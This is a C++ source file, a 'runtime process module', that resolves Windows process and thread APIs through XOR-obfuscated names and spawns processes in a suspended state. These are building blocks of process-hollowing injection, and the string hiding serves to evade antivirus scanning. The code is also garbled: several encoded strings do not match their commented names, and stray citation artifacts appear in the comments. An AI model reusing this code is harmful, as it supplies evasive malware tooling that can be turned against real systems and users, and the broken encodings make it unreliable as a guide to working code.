// runtime_process.cpp — JOCKY Runtime Process Module
#define NULL 0
#include "string_hide.h"

typedef unsigned long DWORD;
typedef void* PVOID;
typedef PVOID HANDLE;
typedef int BOOL;

typedef struct _STARTUPINFOA {
    DWORD cb; PVOID lpReserved; PVOID lpDesktop; PVOID lpTitle;
    DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize;
    DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute;
    DWORD dwFlags; short wShowWindow; short cbReserved2;
    PVOID lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;
} STARTUPINFOA, *PSTARTUPINFOA;

typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION;

typedef BOOL  (__stdcall *Fn_CreateProcessA)(const char*,char*,PVOID,PVOID,BOOL,DWORD,PVOID,const char*,PSTARTUPINFOA,PPROCESS_INFORMATION);
typedef DWORD (__stdcall *Fn_SuspendThread)(HANDLE);
typedef DWORD (__stdcall *Fn_ResumeThread)(HANDLE);
typedef BOOL  (__stdcall *Fn_GetThreadContext)(HANDLE,PVOID);
typedef BOOL  (__stdcall *Fn_SetThreadContext)(HANDLE,const PVOID);

extern "C" PVOID __stdcall GetProcAddress(PVOID hModule, const char* name);
extern "C" PVOID __stdcall GetModuleHandleA(const char* name);

static PVOID get_k32_proc() {
    USE_STR(n, XB(0x31), XB(0x3F), XB(0x28), XB(0x34), XB(0x3F), XB(0x36), XB(0x69), XB(0x68), XB(0x74), XB(0x3E), XB(0x36), XB(0x36)) // kernel32.dll[cite: 2]
    PVOID h = GetModuleHandleA(n);
    ZERO_STR(n);
    return h;
}

extern "C" BOOL jocky_create_proc(const char* app, char* cmd, PPROCESS_INFORMATION pi) {
    static Fn_CreateProcessA fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x19), XB(0x28), XB(0x3F), XB(0x3B), XB(0x2E), XB(0x3F), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E), XB(0x2B)) // CreateProcessA[cite: 2]
        fn = (Fn_CreateProcessA)GetProcAddress(get_k32_proc(), s); ZERO_STR(s);
    }
    STARTUPINFOA si;
    for (int i = 0; i < sizeof(si); i++) ((char*)&si)[i] = 0;
    si.cb = sizeof(si);
    if (fn) return fn(app, cmd, NULL, NULL, 0, 0x00000004 /* CREATE_SUSPENDED */, NULL, NULL, &si, pi);
    return 0;
}

extern "C" DWORD jocky_suspend_thread(HANDLE hThread) {
    static Fn_SuspendThread fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x11), XB(0x37), XB(0x3D), XB(0x39), XB(0x3F), XB(0x28), XB(0x3F), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E)) // SuspendThread[cite: 2]
        fn = (Fn_SuspendThread)GetProcAddress(get_k32_proc(), s); ZERO_STR(s);
    }
    if (fn) return fn(hThread);
    return (DWORD)-1;
}

extern "C" DWORD jocky_resume_thread(HANDLE hThread) {
    static Fn_ResumeThread fn = NULL;
    if (!fn) {
        USE_STR(s, XB(0x0E), XB(0x35), XB(0x3D), XB(0x3B), XB(0x3F), XB(0x28), XB(0x3F), XB(0x0E), XB(0x32), XB(0x28), XB(0x3F), XB(0x3B), XB(0x3E)) // ResumeThread[cite: 2]
        fn = (Fn_ResumeThread)GetProcAddress(get_k32_proc(), s); ZERO_STR(s);
    }
    if (fn) return fn(hThread);
    return (DWORD)-1;
}